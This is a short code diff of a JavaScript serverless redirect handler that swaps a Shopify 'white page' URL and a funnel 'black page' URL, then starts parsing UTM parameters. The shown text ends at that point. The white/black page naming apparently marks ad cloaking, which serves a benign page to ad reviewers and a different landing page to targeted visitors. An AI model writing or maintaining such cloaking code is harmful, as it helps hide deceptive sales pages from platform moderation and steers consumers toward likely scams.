@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://factory-shoes-uk.myshopify.com/collections/template-5/products/test";
-    const blackPageURL = "https://tzhsopchdueis.myfunnelish.com/jdddd-1741634857428461";
+    const whitePageURL = "https://llclothincco.myshopify.com/products/hats";
+    const blackPageURL = "https://allbautepants.myfunnelish.com/ttjdza";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
